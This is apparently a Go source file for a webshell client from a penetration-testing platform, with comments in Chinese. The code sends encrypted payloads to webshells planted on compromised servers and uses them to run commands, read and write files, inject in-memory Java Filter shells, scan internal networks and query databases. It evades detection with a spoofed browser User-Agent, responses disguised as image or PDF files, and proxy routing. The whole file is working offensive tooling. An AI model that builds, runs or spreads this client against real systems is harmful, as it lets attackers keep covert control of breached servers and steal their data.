package webshell

// client.go — Webshell HTTP 加密通信客户端（移植自 AI-PENTEST webshell/client.py）。
// 流程：build_payload → encoder 加密 → POST → 解密响应（失败按明文兜底）→ parse。

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	neturl "net/url"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
)

// Result 一次调用返回的结构化结果（对应 Python parse_response 的 dict）。
type Result struct {
	OK     bool   `json:"ok"`
	Output string `json:"output"`
	CWD    string `json:"cwd"`
	Data   []byte `json:"-"`
	Error  string `json:"error,omitempty"`
}

// smartDecode Windows 中文版命令输出 GBK，Linux UTF-8。UTF-8 strict → GBK strict → GBK replace。
func smartDecode(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	if utf8.Valid(raw) {
		return string(raw)
	}
	if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(raw); err == nil {
		return string(dec)
	}
	// GBK replace：逐字节尽力解码，失败字节替换
	var b strings.Builder
	for i := 0; i < len(raw); {
		if raw[i] < 0x80 {
			b.WriteByte(raw[i])
			i++
			continue
		}
		if i+1 < len(raw) {
			if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(raw[i : i+2]); err == nil {
				b.Write(dec)
				i += 2
				continue
			}
		}
		b.WriteRune('\uFFFD')
		i++
	}
	return b.String()
}

// Parse 解析 shell 响应。
func Parse(raw []byte, op string) Result {
	text := smartDecode(raw)
	res := Result{OK: true}

	if op == "test" {
		if strings.Contains(text, PongMarker) {
			after := strings.SplitN(text, PongMarker, 2)[1]
			nonce := after
			if strings.Contains(after, EndMarker) {
				nonce = strings.SplitN(after, EndMarker, 2)[0]
			}
			res.Output = strings.Trim(strings.Trim(strings.TrimSpace(nonce), "_"), "\" ")
			return res
		}
		preview := text
		if len(preview) > 200 {
			preview = preview[:200]
		}
		return Result{OK: false, Error: "no PONG marker in response: " + preview}
	}

	body := text
	if strings.Contains(text, EndMarker) {
		body = strings.SplitN(text, EndMarker, 2)[0]
	}

	if op == "exec" {
		if strings.Contains(body, CWDMarker) {
			parts := strings.SplitN(body, CWDMarker, 2)
			res.Output = strings.TrimRight(strings.TrimRight(parts[0], "\n"), " ")
			cwdTail := ""
			if len(parts) > 1 {
				cwdTail = parts[1]
			}
			if strings.Contains(cwdTail, "__") {
				cwdTail = strings.SplitN(cwdTail, "__", 2)[0]
			}
			res.CWD = strings.TrimSpace(cwdTail)
		} else {
			res.Output = body
		}
		if strings.HasPrefix(res.Output, "ERROR") {
			res.OK = false
			res.Error = strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(res.Output, "ERROR"), ":"))
			res.Output = ""
		}
		return res
	}

	stripped := strings.TrimSpace(body)
	if strings.HasPrefix(stripped, "ERROR") {
		res.OK = false
		res.Error = strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(stripped, "ERROR"), ":"))
		return res
	}
	res.Output = body

	if op == "read" {
		data, err := base64Decode(stripped)
		if err != nil {
			return Result{OK: false, Error: "base64 decode failed: " + err.Error()}
		}
		res.Data = data
		res.Output = ""
	}
	if op == "list" {
		res.Data = []byte(strings.TrimSpace(stripped))
	}
	return res
}

func base64Decode(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if d, err := base64.StdEncoding.DecodeString(s); err == nil {
		return d, nil
	}
	return base64.URLEncoding.DecodeString(s)
}

// Client 一次性通信客户端（每次调用新建，与原实现一致）。
type Client struct {
	URL        string
	Password   string
	Encoder    string // raw/aes/xor/form-cmd
	ScriptType string // php/jsp/jspx/asp/aspx/py/node
	Timeout    time.Duration
	VerifyTLS  bool
	Cwd        string
	// ExtraHeaders 附加请求头：Header Gate（服务端生成时校验的触发头）与 UA 伪装等。
	ExtraHeaders map[string]string
	// Proxy 出口代理 URL（socks5:// / http://，空=直连）。内网目标平台不在内网时用。
	Proxy string
	// Disguise 响应体伪装链：png / pdf / gif，空=裸密文。
	// 服务端把加密结果包进合法容器返回，这里先剥壳再解密。
	Disguise string
	// Carrier 载荷投递方式：
	//   ""/"script" 默认，把脚本源码（PHP/JS…）发给服务端脚本解释器；
	//   "java"      Java 动态载荷，只发字节码 + op + 参数，由 JSP 载体 defineClass。
	// 仅当目标端部署的是 Java 动态载体时才该设 java，否则服务端拿到的是它解释不了的二进制。
	Carrier string
}

// useJavaCarrier 是否走 Java 动态载荷投递。
func (c *Client) useJavaCarrier() bool { return c.Carrier == "java" }

// RoundTrip 构造 payload → 加密往返 → 解密响应 → 解析。
func (c *Client) RoundTrip(op string, params P) (Result, error) {
	if c.useJavaCarrier() {
		return c.roundTripJava(op, params)
	}
	code, err := BuildPayload(c.ScriptType, op, params)
	if err != nil {
		return Result{}, err
	}
	dec, err := c.exchange([]byte(code), 8<<20)
	if err != nil {
		return Result{}, err
	}
	return Parse(dec, op), nil
}

// exchange 加密 → 发送 → 剥壳 → 解密，返回待解析的明文字节。
// 普通脚本载荷、插件、Java 动态载荷三条路径共用，避免各自复制一份
// 「UA/附加头/代理/TLS/超时」处理，也让伪装链与解密兜底只有一处实现。
func (c *Client) exchange(plain []byte, limit int64) ([]byte, error) {
	enc, err := GetEncoder(c.Encoder)
	if err != nil {
		return nil, err
	}
	body, err := enc.Encrypt(plain, c.Password)
	if err != nil {
		return nil, fmt.Errorf("加密失败: %w", err)
	}
	raw, err := c.send(body, limit)
	if err != nil {
		return nil, err
	}
	raw = c.openContainer(raw)
	dec := enc.Decrypt(raw, c.Password)
	// 原实现约定：响应通常明文，解密失败原样返回
	if !strings.Contains(smartDecode(dec), EndMarker) && strings.Contains(smartDecode(raw), EndMarker) {
		dec = raw
	}
	return dec, nil
}

// send POST 原始字节并读回响应体。
func (c *Client) send(body []byte, limit int64) ([]byte, error) {
	timeout := c.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	tr := &http.Transport{}
	if c.Proxy != "" {
		if pu, perr := neturl.Parse(c.Proxy); perr == nil && pu.Host != "" {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	if !c.VerifyTLS {
		tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec // 渗透场景常见自签证书
	}
	cli := &http.Client{Timeout: timeout, Transport: tr}
	req, err := http.NewRequest(http.MethodPost, c.URL, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	// 正常浏览器 UA，避免被简单 WAF 拦
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	if enc, e := GetEncoder(c.Encoder); e == nil {
		if ct := enc.ContentType(); ct != "" {
			req.Header.Set("Content-Type", ct)
		}
	}
	for k, v := range c.ExtraHeaders {
		if k != "" && v != "" {
			req.Header.Set(k, v)
		}
	}
	resp, err := cli.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求失败: %w", err)
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, limit))
	if err != nil {
		return nil, fmt.Errorf("读响应失败: %w", err)
	}
	return raw, nil
}

// openContainer 剥掉响应体的伪装外壳。
//
// 配置了 Disguise 就按配置剥；没配置时按文件签名自动识别——接管别人部署的
// 容器化 shell 时不必事先知道用的哪条链。识别不了或剥壳失败一律返回原文，
// 让后续的「解密失败按明文兜底」逻辑继续工作，不会因为伪装配置写错就让 shell 失联。
func (c *Client) openContainer(raw []byte) []byte {
	name := c.Disguise
	if name == "" {
		name = DetectDisguise(raw)
	}
	if name == "" {
		return raw
	}
	d, err := GetDisguise(name)
	if err != nil || d == nil {
		return raw
	}
	if body, err := d.Unwrap(raw); err == nil {
		return body
	}
	return raw
}

// Test 探测连通性。
func (c *Client) Test() (Result, error) { return c.RoundTrip("test", P{}) }

// ExecCmd 执行命令（exec）。
func (c *Client) ExecCmd(cmd string) (Result, error) {
	return c.RoundTrip("exec", P{Cmd: cmd, Cwd: c.Cwd})
}

// ListDir 列目录。
func (c *Client) ListDir(path string) (Result, error) { return c.RoundTrip("list", P{Path: path}) }

// ReadFile 读文件（Data 为文件字节）。
func (c *Client) ReadFile(path string) (Result, error) { return c.RoundTrip("read", P{Path: path}) }

// WriteFile 写文件（文本或 base64 二进制 data）。
func (c *Client) WriteFile(path, content string, b64Data string) (Result, error) {
	return c.RoundTrip("write", P{Path: path, Content: content, B64Data: b64Data})
}

// RoundTripExt 插件操作往返：ExtBuild 构造 payload → 加密 → 解析。
// screenshot 特例：输出 IMG:<base64>，剥前缀填入 Data。
func (c *Client) RoundTripExt(op string, p ExtParams) (Result, error) {
	// 扩展插件在脚本载体里是「服务端脚本源码」，Java 载体只认字节码，发过去必然 bad wire magic。
	// 能对齐的几项（内存马/进程/网络/数据库）在载荷里用 JDK 自带 API 重写了等价实现，
	// 映射成载荷 op 后走同一套传输；其余插件（zip/servlet/jar/screenshot）仍是脚本载体专属。
	if c.useJavaCarrier() {
		if jop, args, ok := javaExtOp(op, p); ok {
			return c.javaCall(jop, args, op)
		}
		return Result{}, fmt.Errorf("Java 载体暂不支持扩展操作 %q（可用：memshell*/proc_list/net_scan/db_exec/db_probe；其余插件仍是脚本载体专属）", op)
	}
	code, err := ExtBuild(c.ScriptType, op, p)
	if err != nil {
		return Result{}, err
	}
	dec, err := c.exchange([]byte(code), 32<<20)
	if err != nil {
		return Result{}, err
	}
	res := Parse(dec, op)
	// 插件输出约定：非 test 操作统一以 JSON/文本进 Output；screenshot 剥 IMG: 前缀
	if strings.HasPrefix(res.Output, "IMG:") {
		res.Data, _ = base64.StdEncoding.DecodeString(strings.TrimPrefix(res.Output, "IMG:"))
		res.Output = ""
	}
	return res, nil
}

// roundTripJava Java 动态载荷：编译产物 + op + 参数打包成 wire → 加密 → 发送。
//
// 与脚本载体的差别在「发什么」：脚本载体发源码给目标端解释器，这里只发字节码，
// 由 JSP 载体 defineClass 后反射调用。因此 op 名必须映射成 Payload.run 认识的
// 那一套（test→ping 等），不能直接透传平台内部操作名。
func (c *Client) roundTripJava(op string, params P) (Result, error) {
	if c.ScriptType != "" && c.ScriptType != "jsp" && c.ScriptType != "jspx" {
		return Result{}, fmt.Errorf("Java 载体只支持 jsp/jspx 目标（当前 %s）", c.ScriptType)
	}
	jop, args, err := javaOpArgs(op, params)
	if err != nil {
		return Result{}, err
	}
	return c.javaCall(jop, args, op)
}

// javaCall 把「载荷 op + 参数」打包成 wire 发出去，按 parseOp 解析回显。
// parseOp 用平台操作名（test/list/read…），因为 Parse 的解析规则按平台语义分派，
// 而载荷内部 op 是 ping/list/read 这套，两者不能混用。
func (c *Client) javaCall(jop string, args []string, parseOp string) (Result, error) {
	class, err := BuildJavaPayload()
	if err != nil {
		return Result{}, err
	}
	wire, err := BuildJavaWire(javaPayloadClassName, jop, args, class)
	if err != nil {
		return Result{}, err
	}
	dec, err := c.exchange(wire, 32<<20)
	if err != nil {
		return Result{}, err
	}
	return Parse(dec, parseOp), nil
}

// JavaExtSupported 该插件 op 是否有 Java 载荷等价实现。
// 给 API/Agent 层做前置拦截用——不支持的 op 不必先发一趟请求再报错。
func JavaExtSupported(op string) bool {
	_, _, ok := javaExtOp(op, ExtParams{})
	return ok
}

// javaExtOp 脚本载体的插件 op → Java 载荷 (op, args)。ok=false 表示载荷里没有等价实现。
//
// 内存马与脚本载体的实现差异：那边用 Nashorn 把 JS 对象适配成 Filter，JDK15+ 没有 Nashorn；
// 这里用 Proxy 给容器自己的 Filter 接口生成实现，因此不依赖脚本引擎。
func javaExtOp(op string, p ExtParams) (string, []string, bool) {
	switch op {
	case "memshell_add_filter", "memshell":
		return "memshell_inject", []string{p.FilterName, p.GateHeader, p.GateValue, "cmd"}, true
	case "memshell_list":
		return "memshell_list", nil, true
	case "memshell_del":
		return "memshell_remove", []string{p.FilterName}, true
	case "proc_list":
		// p.Cmd 在面板里是「过滤关键字」：命中 PID / 命令行 / 进程名才保留
		return "proc", []string{"list", p.Cmd}, true
	case "net_scan":
		return "net", []string{"scan", p.ScanHost, p.ScanPorts}, true
	case "net_list":
		return "net", []string{"list"}, true
	case "db_exec":
		return "db", []string{p.DBType, p.Host, p.Port, p.User, p.Pass, p.DB, p.SQL}, true
	case "db_probe":
		return "db", []string{"drivers"}, true
	}
	return "", nil, false
}

// javaOpArgs 平台操作名 → Payload.run 的 (op, args)。
func javaOpArgs(op string, p P) (string, []string, error) {
	switch op {
	case "test", "ping":
		return "ping", nil, nil
	case "exec":
		if strings.TrimSpace(p.Cmd) == "" {
			return "", nil, fmt.Errorf("Java 载体: 命令为空")
		}
		if p.Cwd != "" {
			return "exec", []string{p.Cmd, p.Cwd}, nil
		}
		return "exec", []string{p.Cmd}, nil
	case "info":
		return "info", nil, nil
	case "list":
		return "list", []string{p.Path}, nil
	case "read":
		if strings.TrimSpace(p.Path) == "" {
			return "", nil, fmt.Errorf("Java 载体: 读取需要文件路径")
		}
		return "read", []string{p.Path}, nil
	case "write", "write_bin":
		if strings.TrimSpace(p.Path) == "" {
			return "", nil, fmt.Errorf("Java 载体: 写入需要文件路径")
		}
		// 上传走 base64：wire 里是 UTF-8 字符串，二进制内容直接拼会损坏
		if p.B64Data != "" {
			return "write", []string{p.Path, p.B64Data, "b64"}, nil
		}
		return "write", []string{p.Path, p.Content}, nil
	case "delete":
		return "delete", []string{p.Path}, nil
	case "rename":
		if strings.TrimSpace(p.NewPath) == "" {
			return "", nil, fmt.Errorf("Java 载体: 重命名需要目标路径")
		}
		return "rename", []string{p.Path, p.NewPath}, nil
	case "mkdir":
		return "mkdir", []string{p.Path}, nil
	case "memshell_probe":
		return "memshell_probe", nil, nil
	case "memshell_list":
		return "memshell_list", nil, nil
	case "memshell_remove":
		return "memshell_remove", []string{p.Path}, nil
	}
	return "", nil, fmt.Errorf("Java 载体暂不支持操作 %q（当前支持 test/exec/info/list/read/write/delete/rename/mkdir/memshell）", op)
}
